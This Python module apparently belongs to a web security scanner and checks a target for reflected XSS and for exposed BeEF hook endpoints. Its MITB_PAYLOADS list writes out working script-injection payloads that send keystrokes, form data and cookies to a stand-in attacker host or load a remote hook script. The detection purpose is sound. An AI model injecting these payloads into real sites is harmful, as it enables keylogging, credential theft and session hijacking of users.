"""Man-in-the-Browser (MitB) / BeEF-style browser exploitation payloads and detection."""
from core.http import get
from core.findings import Finding
from core.memory import log_event
import urllib.parse

MITB_PAYLOADS = [
    "<script src='http://attacker.example.com/hook.js'></script>",
    "<script>document.onkeypress=function(e){fetch('http://attacker.example.com/k?k='+e.key)}</script>",
    "<script>document.querySelectorAll('form').forEach(f=>f.addEventListener('submit',e=>{fetch('http://attacker.example.com/f',{method:'POST',body:new FormData(f)})}))</script>",
    "<script>fetch('http://attacker.example.com/s?c='+document.cookie)</script>",
    "<script>window.location='http://attacker.example.com'</script>",
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    from scan.xss import scan_url as xss_scan
    xss_findings = xss_scan(url)
    if xss_findings:
        findings.append(Finding(
            id=f"mitb-capability-{hash(url) & 0xffff:x}",
            target=parsed.netloc,
            type="Man-in-the-Browser (MitB) Capable",
            severity="high",
            url=url,
            parameter="xss",
            payload="BeEF-style hook",
            evidence="Reflected XSS present; browser can be hooked (keylogger/form grabber/session steal)",
            response_snippet=xss_findings[0].response_snippet if xss_findings else "",
            confidence=0.8,
        ))
    for path in ["/hook.js", "/beef/hook.js", "/browser/hook.js"]:
        r = get(f"{parsed.scheme}://{parsed.netloc}{path}")
        if r.status == 200 and ("beef" in (r.text or "").lower() or "hook" in (r.text or "").lower()):
            findings.append(Finding(
                id=f"beef-hook-{hash(url) & 0xffff:x}",
                target=parsed.netloc,
                type="BeEF Hook Endpoint Exposed",
                severity="high",
                url=f"{parsed.scheme}://{parsed.netloc}{path}",
                parameter="path",
                payload=path,
                evidence="BeEF hook script accessible",
                response_snippet=r.snippet(200),
                confidence=0.9,
            ))
    log_event(parsed.netloc, "mitb_scan", {"url": url, "findings": len(findings)})
    return findings
